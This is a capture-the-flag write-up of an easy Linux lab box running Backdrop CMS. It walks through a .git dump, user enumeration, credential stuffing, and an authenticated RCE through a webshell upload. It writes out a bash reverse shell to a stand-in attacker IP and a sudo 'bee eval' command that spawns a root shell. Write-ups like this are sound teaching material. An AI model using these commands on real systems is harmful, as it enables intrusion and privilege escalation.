+++
date = '2026-09-19T23:23:05+02:00'
draft = false
title = 'Dog Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`18/09/2026`**

![pwn.png](/images/imgs_dog/pwn.png)

---
# Introduction

**_Dog_** is an **Easy-level Linux** box that focuses on solid web enumeration and chaining multiple minor misconfigurations to achieve **remote code execution**.

The machine highlights the dangers of exposed **`.git`** directories and poor password management. The initial access relies on dumping credentials from source code, enumerating users through a design flaw, and leveraging an **Authenticated Remote Code Execution** vulnerability in **Backdrop CMS**.

The privilege escalation requires a simple lateral movement via password reuse, followed by a vertical escalation to **root** by abusing a **sudo misconfiguration** on a **CMS** management binary.

---
# Techniques Used

- **Source Code Disclosure (.git dump) → Credential Leak**

- **User Enumeration (Vulnerable Endpoint)**

- **Credential Stuffing Attack**

- **Backdrop CMS Exploitation → Authenticated RCE**

- **Password Reuse (SSH)**

- **Sudo Misconfiguration (bee binary) → Root**

---
# Enumeration
## nmap

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV dog
```

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   10.129.231.223:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open ports**:   

- **22**/tcp - SSH   

- **80**/tcp - HTTP   

## HTTP - Web Enumeration

Browsing to port **`80`** revealed a webpage powered by **Backdrop CMS**.

![bd.png](/images/imgs_dog/bd.png)

While running a directory brute-force scan via **gobuster** in the background, I started to manually enumerate the webpage.

There was a **`Login`** form and a **`Reset Password`** function. 

![doggo.png](/images/imgs_dog/doggo.png)

Additionally, reading the **`About`** section on the homepage leaked a valid domain name inside a contact email:

```text
support@dog.htb
```

![subdom.png](/images/imgs_dog/subdom.png)

Meanwhile, the **gobuster** output returned a hit for an exposed **`.git`** directory (as also highlighted by the previous **nmap** scan).

![gob.png](/images/imgs_dog/gob.png)

I used **git-dumper** to download the repository locally and inspect the source code:

```bash
python3 -m venv venv && source venv/bin/activate
pip install git-dumper
git-dumper http://dog www
```

Analyzing the dumped files, I found a database password hardcoded inside **`settings.php`**.

![sqlpass.png](/images/imgs_dog/sqlpass.png)

I tried using this password on the login form, but I lacked a valid username. 

![login.png](/images/imgs_dog/login.png)

Checking the homepage, I noticed that posts were authored by either **`dogBackDropSystem`** or **`Anonymous`**.

I attempted to log in as **`dogBackDropSystem`** with the **MySQL** password, and the application responded with a different error message:

```text
 Sorry, incorrect password. Have you forgotten your password?
```

![userenum.png](/images/imgs_dog/userenum.png)

**Note**: _This is a classic design vulnerability: the verbose error message confirms that the user exists._

I tried the **`Reset Password`** function, but it returned **`Unable to send mail`**, making it a dead-end rabbit hole.

![reset.png](/images/imgs_dog/reset.png)

After running some **ffuf** scans for virtual hosts and coming up empty-handed, I went back to researching **Backdrop CMS**. Unable to find an immediate exploit path, I was hitting a wall. So, I decided to rely on a classic "last resort" tactic: visiting the box creator's **GitHub** profile.

**Pro-Tip**: _This is a great move whenever you are completely stuck on a **CTF** machine and standard enumeration fails. Looking up the creator's public repositories can often reveal custom enumeration tools, exploit scripts, or the exact vulnerable source code they used to build the box, giving you a direct hint at the intended attack path._

Sure enough, I found a repository named **`BackDropScan`**. I cloned it and used it against the target to enumerate the version:

```bash
python3 BackDropScan.py --url http://dog --version
[+] Version: 1.27.1
```

A quick **searchsploit** lookup revealed that version **`1.27.1`** is vulnerable to an **Authenticated Remote Code Execution**. 

![sp1.png](/images/imgs_dog/sp1.png)

However, since I didn't have valid credentials yet, I tabled the exploit and focused on finding a user.

I ran the tool to fuzz for usernames:

```bash
python3 BackDropScan.py --url http://dog --userslist /usr/share/seclists/Usernames/Names/names.txt --userenum
```

While waiting for the scan, I analyzed the **Python** script to see exactly how it was validating users. The script was querying the endpoint:

- **`/?q=accounts/<username>`**

If you request a non-existent user (like **root**), the server returns **`Page Not Found`**. But if you request a valid user (like **`dogBackDropSystem`**), it returns:

```text
Access denied
You are not authorized to access this page.
```

However, after a few minutes, the brute-force scan successfully enumerated several valid users:

![userlist.png](/images/imgs_dog/userlist.png)

---
# Initial Access | Backdrop CMS → RCE

With a list of valid users and the password dumped from **`settings.php`**, I performed a quick **credential stuffing attack**. I successfully logged into the platform as the user **`tiffany`**.

![logged.png](/images/imgs_dog/logged.png)

Having authenticated access, it was time to trigger the **RCE** I found earlier:

```bash
python3 52021.py dog
```

![init1.png](/images/imgs_dog/init1.png)

To exploit it, I navigated to **`/dog/admin/modules/install`** and clicked on "**`Manual Installation`**". 

![init2.png](/images/imgs_dog/init2.png)

The **CMS** did not support **`.zip`** archives, so I packaged the **PHP webshell** into a **`tar.gz`** archive:

```bash
tar -czvf fall.tar.gz shell
```

I uploaded the archive. 

![init3.png](/images/imgs_dog/init3.png)

![init4.png](/images/imgs_dog/init4.png)

The webshell was successfully deployed and reachable at:
- **`/dog/modules/shell/shell.php`**

![init5.png](/images/imgs_dog/init5.png)

To gain a proper reverse shell, I executed a standard bash payload:

```bash
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/22667 0>&1'
```

![initial.png](/images/imgs_dog/initial.png)

And caught the connection as **`www-data`**.

---
# Lateral Movement | Password Reuse → johncusack

Checking the **`/home`** directory, I noticed the **user flag** was owned by **`johncusack`**.

When dealing with initial footholds, the easiest lateral movement technique is often the most effective. I tried **password reuse**, attempting to **SSH** into the machine using **`johncusack`** and the same password I used for the **CMS**.

![userf.png](/images/imgs_dog/userf.png)

I logged in via **SSH** and grabbed the **user flag**.

---
# Privilege Escalation | Sudo misconfiguration → Root

As always, the first check after gaining a user shell is **`sudo -l`**.

```bash
sudo -l
```

![sudol.png](/images/imgs_dog/sudol.png)

The output revealed that **`johncusack`** could execute **`/usr/local/bin/bee`** with sudo privileges without supplying a password.

**Note**: _**`bee`** is a command-line utility used specifically for managing **Backdrop CMS** installations. It allows server administrators to interact with the **CMS**, manage modules, run database updates, and execute **PHP** code directly from the terminal._

Knowing it's an administrative tool, I referenced **GTFOBins** and started playing with the binary. Because **`bee`** can **evaluate PHP**, we can use it to execute system commands.

![eval.png](/images/imgs_dog/eval.png)

To make it work, I needed to point the binary to the **root** directory of the **Backdrop** installation (**`/var/www/html`**) and pass an eval command to spawn **bash**. Since **`bee`** was running with **sudo**, the resulting shell would be spawned as **root**.

```bash
sudo /usr/local/bin/bee --root=/var/www/html eval 'system("bash");'
```

![rootf.png](/images/imgs_dog/rootf.png)

Execution was successful, dropping me into a **root** shell. The **root flag** was located in **`/root`**.

---
# Final Thoughts

This was a pretty easy and enjoyable box. The web enumeration phase was solid and required chaining multiple small discoveries to progress, which I always appreciate.

The only hiccup I encountered was that the webshell felt a bit unstable: it would die after executing the first command, completely locking me out from running anything else or even re-uploading a new module. I had to revert the machine to get the reverse shell to catch properly. I'm not sure if it was a configuration quirk or if I messed up the upload state, but once past that, the path from initial access to **root** was entirely linear and super intuitive.

**Sources**:

- **Creator's GitHub (FisMatHack) | https://github.com/FisMatHack/BackDropScan**